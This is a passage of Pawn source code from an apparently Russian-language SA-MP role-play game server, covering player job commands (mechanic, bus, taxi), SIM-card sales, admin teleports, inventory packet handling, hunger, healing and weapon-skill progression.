	format(string, sizeof(string), "Вы передали %s цветы", GetName(params[0]), params[1]);
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "%s передал Вам цветы", GetName(playerid), params[1]);
	SendClientMessage(params[0], COLOR_WHITE, string);
	return 1;
}

CMD:sellsim(playerid, params[])
{
	if(PI[playerid][pPhoneNumber] <= 1) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет SIM-карты!");
	else if(sscanf(params, "ui", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /sellsim [id игрока] [цена]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(playerid == params[0]) return SendClientMessage(playerid, COLOR_GREY, "Самому себе нельзя продавать SIM-карту!");
	else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	else if(params[1] < 1 || params[1] > 1000000) return SendClientMessage(playerid, COLOR_GREY, "Цена должна быть от 1 до 1.000.000р");
	new string[144];
	format(string, sizeof(string), "Вы предложили %s купить SIM-карту. Цена: %iр", GetName(params[0]), params[1]);
	SendClientMessage(playerid, COLOR_BLUE, string);
	format(string, sizeof(string), "%s предложил Вам купить SIM-карту. Цена: %iр", GetName(playerid), params[1]);
	SendClientMessage(params[0], COLOR_BLUE, string);
	SendMess(params[0], MSG_PLAYER_ACCESS);
	SetPVarInt(params[0], "KeySim", 1);
	SetPVarInt(params[0], "PlayerSim", playerid);
	SetPVarInt(params[0], "SimPrice", params[1]);
	return 1;
}

CMD:repair(playerid, params[])
{
	if(PI[playerid][pJob] == JOB_MECHANIC)
	{
		if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем эвакуатора!");
		new carid = GetPlayerVehicleID(playerid);
		if(carid >= mechanic[0] && carid <= mechanic[1] || GetVehicleModel(carid) == 525)
		{
			if(sscanf(params, "ui", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /repair [id игрока] [цена]");
			else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
			else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
			else if(params[1] < 1 || params[1] > 1000) return SendClientMessage(playerid, COLOR_GREY, "Цена от 1 до 1000р!");
			else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
			else if(GetPlayerState(params[0]) != 2) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться за рулем транспорта!");
			else if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Ты не можешь починить машину себе!");
			SendMes(playerid, COLOR_LIGHTBLUE, "Вы предложили %s починить его транспорт за %iр", GetName(params[0]), params[1]);
			SendMes(params[0], COLOR_LIGHTBLUE, "%s преложил вам починить Ваш транспорт за %iр", GetName(playerid), params[1]);
			new string[100];
			format(string, sizeof(string), "%s преложил вам починить Ваш транспорт за %iр\n\nВы согласны?", GetName(playerid), params[1]);
			ShowPlayerDialog(params[0], D_JOB+67, 0, "Автомеханик", string, "Да", "Нет");
			SetPVarInt(playerid, "MechVehID", GetPlayerVehicleID(params[0]));
			SetPVarInt(params[0], "PlayerMech", playerid);
			SetPVarInt(params[0], "MechanicPrice", params[1]);
		}
		else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в эвакуаторе!");
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

CMD:refill(playerid, params[])
{
	if(PI[playerid][pJob] == JOB_MECHANIC)
	{
		if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем эвакуатора!");
		new carid = GetPlayerVehicleID(playerid);
		if(carid >= mechanic[0] && carid <= mechanic[1] || GetVehicleModel(carid) == 525)
		{
			if(sscanf(params, "ui", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /refill [id игрока] [цена]");
			else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
			else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
			else if(params[1] < 1 || params[1] > 5000) return SendClientMessage(playerid, COLOR_GREY, "Цена от 1 до 5000р!");
			else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
			else if(GetPlayerState(params[0]) != 2) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться за рулем транспорта!");
			else if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Ты не можешь заправить себе машин!");
			SendMes(playerid, COLOR_LIGHTBLUE, "Вы предложили %s заправить его транспорт за %iр", GetName(params[0]), params[1]);
			SendMes(params[0], COLOR_LIGHTBLUE, "%s преложил вам заправить Ваш транспорт за %iр", GetName(playerid), params[1]);
			new string[100];
			format(string, sizeof(string), "%s преложил вам заправить Ваш транспорт за %iр\n\nВы согласны?", GetName(playerid), params[1]);
			ShowPlayerDialog(params[0], D_JOB+130, 0, "Автомеханик", string, "Да", "Нет");
			SetPVarInt(params[0], "MechanicPlayer", playerid);
			SetPVarInt(params[0], "MechanicPrice", params[1]);
		}
		else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в эвакуаторе!");
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

CMD:fill(playerid, params[])
{
	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_RED, "Вы должны находится за рулем!");
	if(GetVehicleData(GetPlayerVehicleID(playerid), veh_fuel) >= 100) return SendClientMessage(playerid, COLOR_GREY, "Ваш бак полон!");
	if(GetPVarInt(playerid, "Refueling") > 0) return SendClientMessage(playerid, COLOR_RED, "Вы уже заправляетесь!");
	new full;
	for(new i = 1; i <= TOTALBIZZ; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 5.0, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz])
				&& BizzInfo[i][bType] == 2)
		{
			ShowPlayerDialog(playerid, D_JOB+128, 1,"{FFCC00}Заправка", "{ffffff}Введите количество литров для заправки транспорта.", "Далее", "Отмена");
			full++;
			SetPVarInt(playerid, "FuelBizzID", i);
		}
	}
	if(full == 0) return SendClientMessage(playerid, COLOR_RED, "Вы должны находится у заправки!");
	return true;
}

CMD:end(playerid, params[])
{
	if(PI[playerid][pJob] != JOB_BUS) return SendMess(playerid, MSG_YOU_CAN_NOT);
	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем маршрутки!");
	new carid = GetPlayerVehicleID(playerid);
	if(carid >= buscar[0] && carid <= buscar[1])
	{
		if(GetPVarInt(playerid, "PriceBus") > 0)
		{
//		    new CB[16] = Convert(PI[playerid][pBusTime]);
//		    Convert(PI[playerid][pBusTime], CB);
			SendMes(playerid, 0xffd83dFF, "Рабочий день завершен. Вами заработано: %iр. Время рейса: %s", GetPVarInt(playerid, "BusMoney"), Convert(PI[playerid][pBusTime]));
			SendClientMessage(playerid, COLOR_WHITE, "Деньги будут перечислены на счет во время зарплаты");
			PI[playerid][pPayCheck] += GetPVarInt(playerid, "BusMoney");
			MysqlUpdatePlayerInt(playerid, "paycheck", PI[playerid][pPayCheck]);
			DeletePVar(playerid, "BusTime");
			DeletePVar(playerid, "TypeBus");
			DeletePVar(playerid, "PriceBus");
			DeletePVar(playerid, "BusStop");
			DeletePVar(playerid, "BusMoney");
			PI[playerid][pBusTime] = 0;
			pPressed[playerid] = 0;
			if(IsValidDynamic3DTextLabel(BusText3D[playerid])) DestroyDynamic3DTextLabel(BusText3D[playerid]);
			SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			DisablePlayerRaceCheckpoint(playerid);
			return 1;
		}
	}
	else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в маршрутке!");
	return 1;
}

CMD:fare(playerid, params[])
{
	if(PI[playerid][pJob] != JOB_TAXI) return SendMess(playerid, MSG_YOU_CAN_NOT);
	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем такси!");
	new carid = GetPlayerVehicleID(playerid);
	if(carid >= taxicar[0] && carid <= taxicar[22])
	{
		if(GetPVarInt(playerid, "PriceTaxi") > 0)
		{
			SendMes(playerid, COLOR_BLUE, "Рабочий день завершен. Вами заработано: %iр", GetPVarInt(playerid, "TaxiMoney"));
			SendClientMessage(playerid, COLOR_WHITE, "Деньги будут перечислены на счет во время зарплаты");
			DeletePVar(playerid, "PriceTaxi");
			DeletePVar(playerid, "TaxiMoney");
			DeletePVar(playerid, "ClientID");
			if(IsValidDynamic3DTextLabel(TaxiText3D[playerid])) DestroyDynamic3DTextLabel(TaxiText3D[playerid]);
			return 1;
		}
		ShowPlayerDialog(playerid, D_JOB+57, 1, "Тариф", "{ffffff}Введите стоимость проезда:", "Принять", "Отмена");
	}
	else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в такси!");
	return 1;
}

CMD:rt(playerid,params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 6) return 1;
    else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
    new Float:px,Float:py,Float:pz,string[128];
    if(sscanf(params,"p<,>fff",px,py,pz)) return SendClientMessage(playerid, 0xFFFFFFAA, "{9ACD32}Введите: {FFFFFF} /rt <x,y,z>");
    SetPlayerPos(playerid,px,py,pz);
    format(string, sizeof(string), "Вы были телепортированны на указанные вами координаты: %f, %f, %f",px,py,pz);
    SendClientMessage(playerid, 0xFFFFFFAA, string);
    return 1;
}

CMD:rt2(playerid,params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 6) return 1;
    else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
    new Float:px,Float:py,Float:pz,string[128], pw, pi;
    if(sscanf(params,"p<,>fffii",px,py,pz,pw,pi)) return SendClientMessage(playerid, 0xFFFFFFAA, "{9ACD32}Введите: {FFFFFF} /rt <x,y,z>");
    SetPlayerPos(playerid,px,py,pz);
	SetPlayerVirtualWorld(playerid, pw);
	SetPlayerInterior(playerid, pi);
    format(string, sizeof(string), "Вы были телепортированны на указанные вами координаты: %f, %f, %f",px,py,pz);
    SendClientMessage(playerid, 0xFFFFFFAA, string);
    return 1;
}

stock ProxDetectorS(Float:radi, playerid, targetid)
{
    if(!IsPlayerConnected(targetid)) return 0;
	new Float: X, Float: Y, Float: Z;
	GetPlayerPos(targetid, X, Y, Z);
	if(!IsPlayerInRangeOfPoint(playerid, radi, X, Y, Z)) return 0;
	return 1;
}

forward GameModeExitDelay();
public GameModeExitDelay()
{
    foreach(new i: Player)
	{
	    if(!IsPlayerConnected(i)) continue;

		STRING_GLOBAL[0] = EOS;
	    mysql_format(dbHandle, STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS" SET `del_obj` = '1' WHERE name = '%s'", GetName(i));
   		mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	}
	GameModeExit();
}

stock PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z)
{
	if(IsPlayerConnected(playerid))
	{
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		tempposx = (oldposx -x);
		tempposy = (oldposy -y);
		tempposz = (oldposz -z);
		//printf("DEBUG: X:%f Y:%f Z:%f",posx,posy,posz);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
			return 1;
		}
	}
	return 0;
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	if(!PI[playerid][pAdmin])
	{
		AcStruct[playerid][CheckMapTP] = 1;
		AcStruct[playerid][MapTPLastPick] = GetTickCount();
		AcStruct[playerid][MapTP][0] = fX;
		AcStruct[playerid][MapTP][1] = fY;
		AcStruct[playerid][MapTP][2] = fZ;
	}
	else if(PI[playerid][pAdmin] && AdminLogged[playerid] == true)
	{
	    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	    SetPlayerPosFindZ(playerid, fX, fY, fZ);
	}
	return 1;
}

stock UpDateInv(playerid)
{
    PlayerVesItem[playerid]=0;
    for(new i = 16; i > 0; i --)
	{
	    if(PlayerItem1[playerid][i]>0)
	    {
	        PlayerVesItem[playerid]+=Item[PlayerItem1[playerid][i]][iGG]*PlayerItem2[playerid][i];
		}
	}
}

stock CheckMaxVes(playerid,id,kol,&newslot=0)
{
    UpDateInv(playerid);
    new stek=0;
    if(Item[id][iStek]==1)
	{
		for(new s = 16; s > 0; s --)
        {
            if(PlayerItem1[playerid][s]==id){newslot=s;stek=1;break;}
        }
        if(stek==0)
        {
			for(new s = 16; s > 0; s --)
            {
                if(PlayerItem1[playerid][s]==0){newslot=s;stek=1;break;}
            }
        }
	}
	else
	{
		for(new s = 16; s > 0; s --)
        {
            if(PlayerItem1[playerid][s]==0){newslot=s;stek=1;break;}
        }
	}
    if(stek==0){return SendClientMessage(playerid,COLOR_GREY,"У Вас не хватает свободных слотов в сумке! (( Нужен 1 свободный слот))");}
	new ves=PlayerVesItem[playerid];
	ves+=Item[id][iGG]*kol;
	if(PI[playerid][pSprunk]<ves)
	{
	    new string[90];
	    format(string,sizeof(string),"У Вас не хватает места в сумке! (( Нужно еще %i гр. свободного места ))",PI[playerid][pSprunk]-(Item[id][iGG]*kol));
	    SendClientMessage(playerid,COLOR_GREY,string);
	    return true;
	}
	return false;
}

IPacket:213(playerid, BitStream:bs)
{
    printf("packet: 213");
    BS_IgnoreBits(bs, 8);

    new str[255];
    new inventoryAction = IA_SWAP_ITEMS;
    BS_ReadValue(bs, PR_UINT8, inventoryAction);

    if (inventoryAction == IA_SWAP_ITEMS)
    {
		SendClientMessage(playerid, -1, str);

		new target = 0,
			source = 0;
		BS_ReadValue(bs,
			PR_UINT8, target,
			PR_UINT8, source);
		SwapItems(playerid, target, source);
	}
	else if (inventoryAction == IA_USE_ITEM)
	{
	    new itemAction = SA_USE,
			target = 0;
    	BS_ReadValue(bs,
			PR_UINT8, itemAction,
			PR_UINT8, target);
    	if (itemAction == SA_USE)
  		{
  		    new id=PlayerInventory[playerid][target][ItemIconIndex];
			OnPlayerUseItem(playerid, target);
			if (GetPVarInt(playerid, "NotClear") == 1) {
 				ShowInventory(playerid);
 				SetPVarInt(playerid, "NotClear", 0);
   			}
			else if(PlayerInventory[playerid][target][ItemCount] > 1){
				PlayerInventory[playerid][target][ItemCount]--;
 				SaveItem(playerid,target);
 				ShowInventory(playerid);
			}
			else if(id == 20 || id == 21 || id == 22 ||id == 23 || id == 24 || id == 25 || id == 26){
			    CloseInventory(playerid);
			    return ShowPlayerDialog
   				(
 				playerid, D_INVENT, DIALOG_STYLE_INPUT,
			 	"{FFCC00}Зарядить оружие",
			 	"{FFFFFF}Введите сумму патронов,\nКоторыми хотите зарядить оружие:",
			 	"Зарядить", "Выйти"
				 );
   			}
			else {
				ClearSlot(playerid,target);
 				SaveItem(playerid,target);
 				ShowInventory(playerid);
			}
   		}
    	else if (itemAction == SA_DROP) {
			new id=PlayerInventory[playerid][target][ItemIconIndex];
			PlayerDropItemId(playerid,id,1);
			if(PlayerInventory[playerid][target][ItemCount] > 1){
				PlayerInventory[playerid][target][ItemCount]--;
 				SaveItem(playerid,target);
 				ShowInventory(playerid);
			}
			else {
				ClearSlot(playerid,target);
 				SaveItem(playerid,target);
 				ShowInventory(playerid);
			}
    	}
   		else if (itemAction == SA_TRANSFER) {
    	    if (SlotIsEmpty(playerid, target) == 0) {
    	        new total = PlayerInventory[playerid][target][ItemCount];
    	        if (total > 1) {
    	            new freeSlot = FindFreeSlot(playerid);
    	            if (freeSlot > -1) {

						new part = total / 2;
						PlayerInventory[playerid][target][ItemCount] = total - part;

						PlayerInventory[playerid][freeSlot][ItemIconIndex] = PlayerInventory[playerid][target][ItemIconIndex];
						PlayerInventory[playerid][freeSlot][ItemCount] = part;

                        SendInventoryChanges(playerid, target, freeSlot);
                        ShowInventory(playerid);
						SaveItem(playerid, target);
						SaveItem(playerid, freeSlot);
					}
				}
			}
    	}
	}
	return 0;
}


stock OnPlayerUseItem(playerid, target)//инвентарь
{
	new string[128];
	new Float:p[3];
    GetPlayerPos(playerid,p[0],p[1],p[2]);
	new id=PlayerInventory[playerid][target][ItemIconIndex];
	if(id<=0)return SendClientMessage(playerid,COLOR_GREY,"Предмет не найден!");
	switch(id)
	{
	    case 1:return SetPlayerArmour(playerid, 100);//Броник
	    case 2:return OnEatHunger(playerid, 30); //кусочек пиццы
	    case 3:return OnEatHunger(playerid, 65); // бургер
	    case 4:return OnEatHunger(playerid, 25); //Куриная ножка
	    case 5:return OnEatHunger(playerid, 100); // пицца
	    case 6:return OnEatHunger(playerid, 100); //большой бургер
	    case 7:return OnEatHunger(playerid, 45); // Острые куриные ножки
	    case 8:return OnEatHunger(playerid, 100); //пицца свободный
	    case 9:return OnEatHunger(playerid, 50); // бургер
	    case 10:return OnEatHunger(playerid, 20); //куриная ножка свободный
	    case 11:return OnEatHunger(playerid, 65); //пицца в коробке
	    case 12:return OnEatHunger(playerid, 100); // бургер в пакете
	    case 13:return OnEatHunger(playerid, 20); //спранк
	    case 14:return OnEatHunger(playerid, 30); // чай
	    case 15:return OnEatHunger(playerid, 35); // кофе
	    case 16:return OnEatHunger(playerid, 20); //  кокакола
	    case 17:return OnEatHunger(playerid, 25); // вода
	    case 18:return GivePlayerWeapon(playerid,1,1); // Костет
	    case 19:return GivePlayerWeapon(playerid,5,1); // Бита
	    case 20..26:
	    {
 			return ShowPlayerDialog
   			(
 				playerid, D_INVENT, DIALOG_STYLE_INPUT,
			 	"{FFCC00}Зарядить оружие",
			 	"{FFFFFF}Введите сумму патронов,\nКоторыми хотите зарядить оружие:",
			 	"Зарядить", "Выйти"
 			);
		}
        case 27:return SendClientMessage(playerid,COLOR_GREY,"Невозможно использовать предмет!"); //Патроны
		case 28:return SendClientMessage(playerid,COLOR_GREY,"Используйте /call для звонков, /sms для отправки СМС!"); // телефон
	    case 29:return SetPlayerHealth(playerid, 60); // Адреналин
		case 30:return SendClientMessage(playerid,COLOR_GREY,"Невозможно использовать предмет!"); //Номера
	    case 31:return callcmd::fuel(playerid); // канистра
 		case 32:return callcmd::tools(playerid); // рем комплект
	    case 33:return SendClientMessage(playerid,COLOR_GREY,"Невозможно использовать предмет!"); //ключ
	    case 34:
		{
			SetPlayerHealth(playerid, 100); // Большая аптечка
			PI[playerid][pAptechka]--;
		}
		case 35:return callcmd::mask(playerid); // маска
 		case 36:return callcmd::usedrugs(playerid); // накро
	    case 37:return callcmd::smoke(playerid); // сигареты
	}
	ProxDetector(15, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
 	ShowInventory(playerid);
	return true;
}

stock OnEatHunger(playerid, value)
{
	if(PI[playerid][pHunger] > 80 && value > 30)
	{
	    SendClientMessage(playerid, -1, "Вы достаточно сыты.");
	    SetPVarInt(playerid, "NotClear", 1);
	}
	else
	{
   		new str[124];
  		PI[playerid][pHunger] += value;

		format(str, sizeof(str), "Вы успешно поели и востановили %d голода.", value);
		SendClientMessage(playerid, -1, str);
 	}
	return true;
}


stock GetGunIdInItem(item)
{
	switch(item)
	{
	    case 18:return 1;
	    case 19:return 5;
	    case 20:return 25;
	    case 21:return 22;
	    case 22:return 24;
	    case 23:return 29;
	    case 24:return 30;
	    case 25:return 31;
	    case 26:return 33;
	    default:return false;
	}
	return false;
}

stock CheckUseGun(playerid,item,oks=0)
{
	new idgun=GetGunIdInItem(item);
	if(idgun==0)return false;
    new weapons[13][2],ok=0;
	for (new i = 0; i <= 12; i++)
	{
	    GetPlayerWeaponData(playerid, i, weapons[i][0], weapons[i][1]);
	    if(weapons[i][0]==idgun)
	    {
	        for(new s = 16; s > 0; s --)
	        {
	            if(PlayerItem1[playerid][s]==item){ok++;}
	        }
	        break;
	    }
	}
	if(ok==1&&oks==1)return true;
	if(ok==1&&oks==0)return SendClientMessage(playerid,COLOR_GREY,"Прежде чем передать/выкинуть уберите оружие. (/unammo)");
	return false;
}

stock HospitalHealth(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 200.0, 1198.0663,-598.5817,1002.3359) || IsPlayerInRangeOfPoint(playerid, 100.0, 1840.1278,1607.4762,1021.7215))
	{
		if(PI[playerid][pHeal] < 99.00)
 		{
 		    if(GetPVarInt(playerid, "floodhealt") > gettime()) return true;
	   		{
				if(PI[playerid][pVip])
				{
				    GameTextForPlayer(playerid,"~w~~n~~n~~n~~n~~n~~n~~n~~n~~n~+ 3 HP",300,4);
					SetHealth(playerid,PI[playerid][pHeal] + 3.0);
					SetPVarInt(playerid, "floodhealt", gettime()+2);
				}
				else if(IsAArmy(playerid))
				{
	   				GameTextForPlayer(playerid,"~w~~n~~n~~n~~n~~n~~n~~n~~n~~n~+ 1 HP",300,4);
				    SetHealth(playerid,PI[playerid][pHeal] + 1.0);
				    SetPVarInt(playerid, "floodhealt", gettime()+2);
	   			}
				else
				{
				    GameTextForPlayer(playerid,"~w~~n~~n~~n~~n~~n~~n~~n~~n~~n~+ 1 HP",300,4);
				    SetHealth(playerid,PI[playerid][pHeal] + 1.0);
				    SetPVarInt(playerid, "floodhealt", gettime()+2);
				}
			}
   		}
       	else
        {
	        PI[playerid][pBed] = 0;
	        PI[playerid][pCity] = 0;
	        PlayerDied[playerid] = false;
			MysqlUpdatePlayerInt(playerid, "city", PI[playerid][pCity]);
			MysqlUpdatePlayerInt(playerid, "bed", PI[playerid][pBed]);
			//SendClientMessage(playerid,C_OSNOV,"Курс лечения пройден");
	   	}
	}
	return 1;
}

public OnVehicleDamageStatusUpdate(vehicleid, playerid)
{
	SetPVarInt(playerid,"EngineStalled",GetPVarInt(playerid,"EngineStalled")+1);
	if(GetPVarInt(playerid,"EngineStalled") >= 4 && GetVehicleData(vehicleid, veh_engine) == true && !PI[playerid][pImprove][3])
	{
		GetVehicleData(vehicleid, veh_engine) = false;
		GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(vehicleid,false,lights,alarm,doors,bonnet,boot,objective);
		GameTextForPlayer(playerid, "ENGINE ~r~OFF", 1000, 6);

		//g_vehicle[vehicleid][veh_wear] += 50.0; // 0.5 процента

		DeletePVar(playerid,"EngineStalled");

		new Float: health;

		GetVehicleHealth(vehicleid, health);

		if(GetVehicleData(vehicleid, veh_owner_id) != INVALID_PLAYER_ID)
		{
			SetVehicleData(vehicleid, veh_health, health);

			if(health < 300.0)
			{
				SetVehicleData(vehicleid, veh_health, 300.0);
			}
		}

		new Float: old_health = GetPVarFloat(playerid, "car_damage");

		old_health -= floatabs((old_health - health));

		SetPVarFloat(playerid, "car_damage", old_health);

		switch(old_health)
		{
			case 0..100: g_vehicle[vehicleid][veh_wear] += 0.1;
			case 101..200: g_vehicle[vehicleid][veh_wear] += 0.2;
			case 201..300: g_vehicle[vehicleid][veh_wear] += 0.3;
			case 301..400: g_vehicle[vehicleid][veh_wear] += 0.4;
			case 401..500: g_vehicle[vehicleid][veh_wear] += 0.5;
			case 501..600: g_vehicle[vehicleid][veh_wear] += 0.6;
			case 601..700: g_vehicle[vehicleid][veh_wear] += 0.7;
			case 701..800: g_vehicle[vehicleid][veh_wear] += 0.8;
			case 801..900: g_vehicle[vehicleid][veh_wear] += 0.9;
			case 901.1000: g_vehicle[vehicleid][veh_wear] += 0.10;
		}

		printf("%f", g_vehicle[vehicleid][veh_wear]);
	}
	return 1;
}

stock strtok(const strin[], &index)
{
	new length = strlen(strin);
	while ((index < length) && (strin[index] <= ' '))
	{
		index++;
	}

	new offset = index;
	new result[20];
	while ((index < length) && (strin[index] > ' ') && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = strin[index];
		index++;
	}
	result[index - offset] = EOS;
	return result;
}

stock emptyMessage(string[])
{
    for(new i; string[i] != 0x0; i++)
    {
        switch(string[i])
        {
            case 0x20: continue;
            default: return 0;
        }
    }
    return 1;
}

stock SetPlayerSkills(playerid)
{
	SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL_SILENCED, 		g_player_skills[playerid][S_GUN][0]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_DESERT_EAGLE, 		g_player_skills[playerid][S_GUN][1]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, 				g_player_skills[playerid][S_GUN][2]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_MP5, 					g_player_skills[playerid][S_GUN][3]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_AK47, 				g_player_skills[playerid][S_GUN][4]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_M4, 					g_player_skills[playerid][S_GUN][5]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, 				g_player_skills[playerid][S_GUN][6]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_MICRO_UZI, 			g_player_skills[playerid][S_GUN][7]*10);

	SavePlayerSkills(playerid);

	return 1;
}

stock OnPlayerAmmoChange(playerid, newammo, oldammo)
{
    if(newammo < oldammo)
	{
		switch(GetPlayerWeapon(playerid))
		{
		    case 22:
			{
				Shot[playerid][6]++;
				if(Shot[playerid][6] >= AMMO_PISTOL && g_player_skills[playerid][S_GUN][6] < 100 && !PI[playerid][pVip])
				{
					g_player_skills[playerid][S_GUN][6]++, Shot[playerid][6] = 0;
					SendClientMessage(playerid, COLOR_DARKORANGE, "Ваш скилл оружия 'Pistol 9mm' повышен.");
				}
				else if(Shot[playerid][6] >= AMMO_PISTOL_VIP && g_player_skills[playerid][S_GUN][6] < 100 && PI[playerid][pVip])
				{
					g_player_skills[playerid][S_GUN][6]++, Shot[playerid][6] = 0;
					SendClientMessage(playerid, COLOR_DARKORANGE, "Ваш скилл оружия 'Pistol 9mm' повышен.");
				}
			}
		    case 23:
			{
				Shot[playerid][0]++;
				if(Shot[playerid][0] >= AMMO_SDPISTOL && g_player_skills[playerid][S_GUN][0] < 100 && !PI[playerid][pVip])
				{
					g_player_skills[playerid][S_GUN][0]++, Shot[playerid][0] = 0;
					SendClientMessage(playerid, COLOR_DARKORANGE, "Ваш скилл оружия 'Silenced 9mm' повышен.");
				}
				else if(Shot[playerid][0] >= AMMO_SDPISTOL_VIP && g_player_skills[playerid][S_GUN][0] < 100 && PI[playerid][pVip])
				{
					g_player_skills[playerid][S_GUN][0]++, Shot[playerid][0] = 0;
					SendClientMessage(playerid, COLOR_DARKORANGE, "Ваш скилл оружия 'Silenced 9mm' повышен.");
				}
			}
			case 24:
			{
				Shot[playerid][1]++;
				if(Shot[playerid][1] >= AMMO_DEAGLE && g_player_skills[playerid][S_GUN][1] < 100 && !PI[playerid][pVip])
				{
					g_player_skills[playerid][S_GUN][1]++, Shot[playerid][1] = 0;
					SendClientMessage(playerid, COLOR_DARKORANGE, "Ваш скилл оружия 'Desert Eeagle' повышен.");
				}
				else if(Shot[playerid][1] >= AMMO_DEAGLE_VIP && g_player_skills[playerid][S_GUN][1] < 100 && PI[playerid][pVip])
				{
					g_player_skills[playerid][S_GUN][1]++, Shot[playerid][1] = 0;
					SendClientMessage(playerid, COLOR_DARKORANGE, "Ваш скилл оружия 'Desert Eeagle' повышен.");
				}
			}
			case 25:
			{
				Shot[playerid][2]++;
				if(Shot[playerid][2] >= AMMO_SHOTGUN && g_player_skills[playerid][S_GUN][2] < 100 && !PI[playerid][pVip])
				{
					g_player_skills[playerid][S_GUN][2]++, Shot[playerid][2] = 0;
					SendClientMessage(playerid, COLOR_DARKORANGE, "Ваш скилл оружия 'Shotgun' повышен.");
				}
				else if(Shot[playerid][2] >= AMMO_SHOTGUN_VIP && g_player_skills[playerid][S_GUN][2] < 100 && PI[playerid][pVip])
				{
					g_player_skills[playerid][S_GUN][2]++, Shot[playerid][2] = 0;
					SendClientMessage(playerid, COLOR_DARKORANGE, "Ваш скилл оружия 'Shotgun' повышен.");
				}
			}
			case 28:
			{
				Shot[playerid][7]++;
				if(Shot[playerid][7] >= AMMO_MICROUZI && g_player_skills[playerid][S_GUN][7] < 100 && !PI[playerid][pVip])
				{
					g_player_skills[playerid][S_GUN][7]++, Shot[playerid][7] = 0;
					SendClientMessage(playerid, COLOR_DARKORANGE, "Ваш скилл оружия 'Micro Uzi' повышен.");
				}
				else if(Shot[playerid][7] >= AMMO_MICROUZI_VIP && g_player_skills[playerid][S_GUN][7] < 100 && PI[playerid][pVip])
				{
					g_player_skills[playerid][S_GUN][7]++, Shot[playerid][7] = 0;
					SendClientMessage(playerid, COLOR_DARKORANGE, "Ваш скилл оружия 'Micro Uzi' повышен.");
				}
			}
			case 29:
			{
				Shot[playerid][3]++;
				if(Shot[playerid][3] >= AMMO_MP5 && g_player_skills[playerid][S_GUN][3] < 100 && !PI[playerid][pVip])
				{
